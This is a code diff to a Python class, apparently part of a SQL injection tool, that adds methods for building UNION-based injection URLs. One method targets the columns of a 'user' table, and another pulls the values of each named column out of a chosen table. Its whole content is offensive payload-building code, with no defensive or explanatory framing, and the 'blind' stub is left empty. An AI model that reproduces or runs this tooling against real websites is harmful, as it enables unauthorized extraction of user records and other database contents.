@@ -60,10 +60,11 @@ class Builder:
         return injections 
 
     
-    def tables(self, num_cols, magic_col):
-        """ :num_cols:  Number of columns for UNION statement.
+    def columns(self, num_cols, magic_col):
+        """ Build SQLI to get columns of a specified table.
+            :num_cols:  Number of columns for UNION statement.
             :magic_col: Column number that is most visible, and therefore used for injection parameter.
-            :returns:   Dict of strings with queries regarding tables
+            :returns:   Dict of strings->strings with queries regarding table's columns
         """
 
         union_urls = self.union_nums(num_cols) 
@@ -73,10 +74,29 @@ class Builder:
         a += self.delimiter + 'where' + self.delimiter + 'table_name=\'user\''
         return {'users' : a}
 
+    def values(self, num_cols, magic_col, table_name, col_names):
+        """ Build SQLI to get values of each column in a specified table.
+            :num_cols:      Number of columns for UNION statement.
+            :magic_col:     Column number that is most visible, and therefore used for injection parameter.
+            :table_name:    String representing table name.
+            :col_names:     List of column names in table.
+            :returns:       Dict of strings->strings with queries regarding table's columns
+        """
+
+        injections = {}
+        union_urls = self.union_nums(num_cols) 
+
+        for col_name in col_names:
+            union_urls[magic_col - 1] = self.delimiter + col_name
+            injections[col_name] = self.null_url + self.union_string + ','.join(union_urls)
+            injections[col_name] += self.delimiter + 'from' + self.delimiter + table_name
+
+        return injections 
+
+
+
     def blind():
         return 0
 
 
-
-#
 
